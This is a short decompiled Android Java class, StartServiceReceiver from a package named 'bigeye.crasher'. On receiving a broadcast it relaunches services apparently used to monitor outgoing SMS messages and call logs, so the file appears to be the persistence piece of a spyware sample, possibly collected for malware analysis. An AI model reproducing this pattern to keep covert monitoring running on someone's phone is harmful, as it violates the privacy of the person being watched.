package com.bigeye.crasher;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
/* loaded from: classes.dex */
public class StartServiceReceiver extends BroadcastReceiver {
    public Context context;
    private String OUTGOING_SVC_NAME = OutgoingSMSService.class.getName();
    private String CALLLOG_SVC_NAME = MonitorCallLogsService.class.getName();
    private String APP_TAG = "StartServiceReceiver";

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        Intent service = new Intent(context, OutgoingSMSService.class);
        Intent LogService = new Intent(context, MonitorCallLogsService.class);
        if (!isServiceRunning(this.OUTGOING_SVC_NAME)) {
            context.startService(service);
        } else if (!isServiceRunning(this.CALLLOG_SVC_NAME)) {
            context.startService(LogService);
        }
    }

    public boolean isServiceRunning(String SVC_NAME) {
        Context context = this.context;
        Context context2 = this.context;
        ActivityManager manager = (ActivityManager) context.getSystemService("activity");
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (SVC_NAME.equals(service.service.getClassName())) {
                Log.i(this.APP_TAG, SVC_NAME + " already running!");
                return true;
            }
        }
        Log.i(this.APP_TAG, SVC_NAME + " not running!");
        return false;
    }
}
